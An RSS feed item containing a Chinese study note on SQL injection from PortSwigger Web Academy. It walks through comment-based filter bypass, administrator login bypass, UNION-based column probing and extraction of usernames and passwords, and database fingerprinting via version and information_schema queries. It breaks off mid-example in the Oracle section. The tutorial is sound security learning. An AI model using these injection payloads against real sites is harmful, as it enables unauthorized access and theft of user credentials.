<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>SQL - Tag - 索元的博客</title>
        <link>http://localhost:1313/tags/sql/</link>
        <description>SQL - Tag - 索元的博客</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>s5n666@outlook.com (suo yuan)</managingEditor>
            <webMaster>s5n666@outlook.com (suo yuan)</webMaster><lastBuildDate>Tue, 27 Dec 2022 03:42:51 &#43;0000</lastBuildDate><atom:link href="http://localhost:1313/tags/sql/" rel="self" type="application/rss+xml" /><item>
    <title>SQL Injection</title>
    <link>http://localhost:1313/posts/portswigger_sqlinj/</link>
    <pubDate>Tue, 27 Dec 2022 03:42:51 &#43;0000</pubDate>
    <author>s5n666@outlook.com (suo yuan)</author>
    <guid>http://localhost:1313/posts/portswigger_sqlinj/</guid>
    <description><![CDATA[<p>PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分</p>
<h1 id="sql-injection">SQL Injection</h1>
<h2 id="漏洞概述">漏洞概述</h2>
<p>SQL注入是一个Web漏洞。该漏洞能够让攻击者影响Web应用对其数据库的查询，通常允许攻击者查看无法查看到的数据，其中可能包括其他用户的数据。很多时候攻击者可以通过该漏洞修改甚至删除这些数据。</p>
<h3 id="成功的sql注入的影响如何">成功的SQL注入的影响如何</h3>
<p>成功的SQL注入可能导致未授权访问敏感数据。近年来很多数据泄露事件都是SQL注入导致。有时攻击者可以依此在系统中获取一个持久的后门。</p>
<h2 id="漏洞利用方向">漏洞利用方向</h2>
<p>一个常见的SQL注入的利用方向包括：</p>
<ul>
<li>返回隐藏数据，修改SQL查询以返回其他结果</li>
<li>更改Web应用逻辑，更改查询以干扰Web应用的逻辑</li>
<li>联合查询，从不同的数据库检索数据</li>
<li>查询数据库本身的信息</li>
<li>盲注，查询的结果不会返回</li>
</ul>
<h2 id="漏洞利用">漏洞利用</h2>
<h3 id="返回隐藏数据">返回隐藏数据</h3>
<p>假设一个显示不同类别的购物网站，用户单击礼物的时候，请求的URL是这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/products?category=Gifts</span></span></code></pre></div></div>
<p>这将导致Web应用执行SQL查询，从数据库中查找相关产品的信息</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">released</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span></span></span></code></pre></div></div>
<p>该SQL查询要求数据库返回：</p>
<ul>
<li>所有 (*)</li>
<li>来自<code>product</code>表</li>
<li>其中的<code>category</code>得是<code>Gifts</code></li>
<li>并且<code>released</code>等于1</li>
</ul>
<p>其中<code>released = 1</code>用于隐藏没有发布的产品。如果该网站没有防御SQL注入的话，攻击者修改URL成这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/products?category=Gifts&#39;--</span></span></code></pre></div></div>
<p>这样SQL语句就得是：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="c1">--&#39; AND released = 1</span></span></span></code></pre></div></div>
<p>这里的关键就是<code>--</code>，这是SQL中的注释符号。这样就有效地屏蔽了<code>AND released = 1</code>的作用。</p>
<p>攻击者还可以更进一步，查看任何类别的所有产品：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/products?category=Gifts&#39;+OR+1=1--</span></span></code></pre></div></div>
<p>SQL语句就会是：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--&#39; AND released = 1</span></span></span></code></pre></div></div>
<p>这样就会返回<code>category</code>是<code>Gifts</code>或者<code>1=1</code>的产品，因为1肯定是等于1的，所以会返回所有。</p>
<p><code>--</code>是SQL中的注释符号。在MYSQL中，<code>--</code>后面需要跟一个空格，或者使用<code>#</code>来表示注释符。</p>
<h3 id="更改web应用逻辑">更改Web应用逻辑</h3>
<p>假设一个允许用户通过用户名和密码的方式登录的网站。用户提交用户名为username，密码为passwd，Web应用确认是否这正确的SQL语句这样写：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;username&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;passwd&#39;</span></span></span></code></pre></div></div>
<p>这里攻击者可以作为任意用户登录，只需SQL中的注释符号<code>--</code>，屏蔽掉密码检查那一部分。例如提交用户名<code>administrator'--</code>和一个空密码就会让SQL语句变成这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="c1">--&#39; AND password = &#39;&#39;</span></span></span></code></pre></div></div>
<h3 id="联合查询">联合查询</h3>
<p>攻击者可以从数据库的其他表中检查数据，这是利用<code>UNION</code>关键字完成，它允许再加一个或多个<code>SELECT</code>查询并把结果追加到原本的查询结果上。</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">c</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span></span></span></code></pre></div></div>
<p>这个SQL查询将返回一个包含两个列的结果，包含<code>table1</code>的a、b的值和<code>table2</code>的c、d的值。</p>
<p>联合查询的要求：</p>
<ul>
<li>每个查询返回的列的数量是相同的</li>
<li>每个列的数据类型必须和各个查询兼容</li>
</ul>
<p>为了满足这两个要求，通常要弄清楚：</p>
<ul>
<li>原本的查询返回多少列</li>
<li>原本的查询返回的那些列有合适的数据类型用来保存查询的结果</li>
</ul>
<h4 id="确定列的数量">确定列的数量</h4>
<h5 id="order-by">ORDER BY</h5>
<p>注入一系列<code>ORDER BY</code>语句并递增指定的column index直到报错。假设注入点和上述都差不多，就应该是：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; ORDER BY 1--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; ORDER BY 2--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; ORDER BY 3--
</span></span></span><span class="line"><span class="cl"><span class="s1">etc.</span></span></span></code></pre></div></div>
<p>上述这些payload修改了原本的查询，让结果中的所有列按照其中某一列的顺序进行排序，具体哪一列由<code>ORDER BY</code>指定，因此无需知晓列的名称。当指定的column index超过了实际的列的数量时，数据库就会报错，比如：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">The ORDER BY position number 3 is out of range of the number of items in the select list.</span></span></code></pre></div></div>
<p>网站可能会在HTTP响应中体现出这个错误，也可能是在返回结果中，或者就不返回。检测响应中的差异来判断到底由多少列。</p>
<h5 id="union-select">UNION SELECT</h5>
<p>提交一系列<code>UNION SELECT</code>的payload，指定不同数量的空值：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,NULL--
</span></span></span><span class="line"><span class="cl"><span class="s1">etc.</span></span></span></code></pre></div></div>
<p>如果空值的数量和列的数目不一样，数据库就会报错，如：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</span></span></code></pre></div></div>
<p>和第一个方法一样，网站对返回报错的态度是不一样的。当空值的数量和列的数量匹配时，数据库会多返回一行，其中每列都是空值。对HTTP响应的影响取决去网站代码。幸运的话，攻击者可以在响应中看到额外的内容，比如HTML表中的另一行。否则空值会触发不同的错误，如<code>NullPointerException</code>。最难的是，该响应可能因为不正确的空值数量引起的响应无法区分，导致这个方法失效。</p>
<p>使用NULL的原因是因为每个列的数据类型有个兼容问题，NULL可以转换成任何常用的数据类型，可以最大限度地提高payload得以成功的机会。</p>
<p>在Orcale数据库中，每一个<code>SELECT</code>查询都需要一个<code>FROM</code>关键字并指定一个有效的表。Orcale有一个<code>double</code>内置表。因此，payload在Orcale数据库中可以是这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL FROM DUAL--</span></span></span></code></pre></div></div>
<h4 id="查找有用的列">查找有用的列</h4>
<p>通常查找的数据将采用字符串的格式，因此攻击者需要再原本查询结果中找到一个或多个数据类型为字符串或者和它兼容的列。</p>
<p>确定了列的数量后，可以提交一系列的<code>UNION SELECT</code>的paylaod来测试每个列，以测试是否可以保存字符串数据，例如：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,NULL,NULL,NULL--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;,NULL,NULL--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;,NULL--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
<p>如果列的数据类型和字符串数据不兼容就会报错，如：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Conversion</span> <span class="n">failed</span> <span class="n">when</span> <span class="n">converting</span> <span class="n">the</span> <span class="n">varchar</span> <span class="n">value</span> <span class="s1">&#39;a&#39;</span> <span class="n">to</span> <span class="n">data</span> <span class="n">type</span> <span class="ne">int</span><span class="o">.</span></span></span></code></pre></div></div>
<p>如果没有报错。并且网站的响应包含一些附加内容（注入的字符串值），就可以用这个列来查询字符串数据。</p>
<h4 id="查询数据">查询数据</h4>
<p>当确定了列的个数和有用的列的位置，就可以开始查询数据了。</p>
<p>假设：</p>
<ul>
<li>原本的查询返回两列，两列都可以保存字符串数据</li>
<li>注入点和上述一样是<code>WHERE</code>中带单引号的字符串</li>
<li>数据库中有一个名为<code>users</code>的表，其中由<code>username</code>和<code>password</code>两列</li>
</ul>
<p>这样的话，相关payload应当是这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT username, password FROM users--</span></span></span></code></pre></div></div>
<p>使用这样的payload的关键也在于攻击者知道表名和列名。现在数据库都提供了一些方法去确定它有那些表和列。</p>
<h5 id="在一个列中查询多个值">在一个列中查询多个值</h5>
<p>还是上述的例子，如果只有一个合适的列的话，可以把这些值连接到一起并在中间加上用于区分的分隔符。例如，在Orcale中，payload可以是这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT username || &#39;</span><span class="o">~</span><span class="s1">&#39; || password FROM users--</span></span></span></code></pre></div></div>
<p><code>||</code>在Orcale中用于字符串连接。该payload把用户名和密码连接起来，并且用<code>~</code>分隔</p>
<h3 id="查询数据库本身的信息">查询数据库本身的信息</h3>
<p>SQL注入中，通常需要收集与数据库本身相关的信息，比如数据库的类型和版本，以及包含的表名和列名。</p>
<h4 id="数据库的类型和版本">数据库的类型和版本</h4>
<p>不同的数据库的查询语句也不同。通常需要多次查询来找到一个有效的查询，从而确定数据库的类型和版本</p>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: center">查询语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Microsoft, MySQL</td>
          <td style="text-align: center">SELECT @@version</td>
      </tr>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: center">SELECT * FROM v$version</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: center">SELECT version()</td>
      </tr>
  </tbody>
</table>
<p>例如你输入如下paylaod</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT @@version--</span></span></span></code></pre></div></div>
<p>如果返回类似下面的输出，那就确认数据库是Microsoft SQL Server并且也能得到它的版本</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
</span></span><span class="line"><span class="cl">Mar 18 2018 09:11:49
</span></span><span class="line"><span class="cl">Copyright (c) Microsoft Corporation
</span></span><span class="line"><span class="cl">Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)</span></span></code></pre></div></div>
<h4 id="列出数据库的内容">列出数据库的内容</h4>
<p>大多数数据库（除了Orcale）都有一个information schema用于提供有关数据库的信息</p>
<p>攻击者可以查询<code>information_schema.tables</code>以列出数据库中的表</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span></span></span></code></pre></div></div>
<p>输出可能是这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
</span></span><span class="line"><span class="cl">=====================================================
</span></span><span class="line"><span class="cl">MyDatabase     dbo           Products    BASE TABLE
</span></span><span class="line"><span class="cl">MyDatabase     dbo           Users       BASE TABLE
</span></span><span class="line"><span class="cl">MyDatabase     dbo           Feedback    BASE TABLE</span></span></code></pre></div></div>
<p>这个输出表明由三个表，分别是Products、Users和Feedback。</p>
<p>攻击者可以通过查询<code>information_schema.columns</code>来列出指定表的列</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Users&#39;</span></span></span></code></pre></div></div>
<h5 id="orcale中的information-schema">Orcale中的information schema</h5>
<p>在Orcale中需要用别的方法来达到上述的效果</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
